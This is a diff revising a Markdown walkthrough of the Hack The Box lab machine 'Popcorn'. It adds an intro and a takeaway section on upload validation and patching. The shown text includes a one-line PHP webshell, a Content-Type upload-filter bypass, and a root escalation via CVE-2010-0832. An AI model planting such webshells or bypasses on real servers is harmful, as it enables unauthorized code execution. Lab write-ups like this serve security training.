@@ -3,6 +3,16 @@
 Machine: [Popcorn](https://app.hackthebox.com/machines/Popcorn):
 Medium . Linux
 
+In this medium Linux machine, we exploit a Torrent Hoster web application that validates
+uploads only by their `Content-Type` header. Bypassing that check lets us upload a PHP webshell
+for remote code execution, and an outdated PAM stack (CVE-2010-0832, PAM MOTD) gives us root.
+You will learn how to:
+
+- Enumerate a web application and discover the Torrent Hoster upload feature
+- Bypass a `Content-Type`-based file-upload filter with Burp Suite
+- Gain RCE through an uploaded PHP webshell
+- Escalate to root using the PAM MOTD local privilege escalation (CVE-2010-0832)
+
 ---
 Tags: #file-upload-bypass #content-type-bypass #webshell #CVE-2010-0832 #PAM-MOTD #privesc #linux
 
@@ -127,21 +137,21 @@ PNG                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration:
 :: Progress: [29999/29999] :: Job [1/1] :: 105 req/sec :: Duration: [0:03:47] :: Errors: 1 ::
 ```
 
-We can see the web interface is a **Torrent Hoster** application, a torrent management application with upload functionality:
+We can see that the web interface is **Torrent Hoster**, a torrent management application with upload functionality:
 ![Popcorn](img/Popcorn-0002.png)
 
 We registered with test credentials to obtain authenticated access:
 ![Popcorn](img/Popcorn-0003.png)
 
-We can see it's vulnerable to a file upload attack: [Exploit](https://www.exploit-db.com/exploits/11746 )
+We can see it's vulnerable to a file upload attack: [Exploit](https://www.exploit-db.com/exploits/11746)
 
-We create a webshell:
+We created a webshell:
 ```bash
 ❯ cat shell.php -p
 <?php system($_GET["cmd"]); ?>
 ```
 
-We created a valid torrent file and uploaded a valid torrent to obtain the ID assigned by the application:
+We created a valid torrent file and uploaded it to obtain the ID assigned by the application:
 ```bash
 ❯ file valid.torrent
 valid.torrent: BitTorrent file
@@ -303,3 +313,11 @@ We extracted the `root.txt` flag:
 root@popcorn:/tmp# cat /root/root.txt
 <ROOT_FLAG>
 ```
+
+---
+
+## Takeaway
+
+- **Validate uploads by content, not by the `Content-Type` header.** The client fully controls that header. Real validation checks the file contents and extension server-side, and stores uploads outside the web root.
+- **Never let uploaded files execute under the web root.** The webshell ran only because it landed in `/torrent/upload/` as a `.php`. Uploads should be stored where the server will not execute them.
+- **Keep the OS and PAM stack patched.** CVE-2010-0832 is ancient; a maintained host would not have been vulnerable to the PAM MOTD escalation.
